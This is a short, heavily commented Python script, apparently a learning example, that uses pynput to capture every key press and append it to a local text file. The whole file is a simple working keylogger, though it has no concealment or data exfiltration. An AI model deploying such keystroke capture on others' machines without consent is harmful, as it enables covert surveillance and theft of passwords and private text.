from pynput import keyboard  # Import the keyboard module from pynput library which controls and monitors keyboard events

def KeyPressed(key):

    print(str(key))  
    with open("keyfile.txt", 'a') as logKey:  
        try:
            char = key.char  # set variable to get character representation of pressed key
            logKey.write(char)  # Writes the character representation to the log file
        except:  
            print("Error getting char")  

if __name__ == "__main__":
   
    listener = keyboard.Listener(on_press=KeyPressed)  # 'Listener' class from pynput assigned to the variable listener to listen for pressed keys.

    listener.start()  
    input()  # Keep the program running by waiting for user input (keeps the main thread alive)
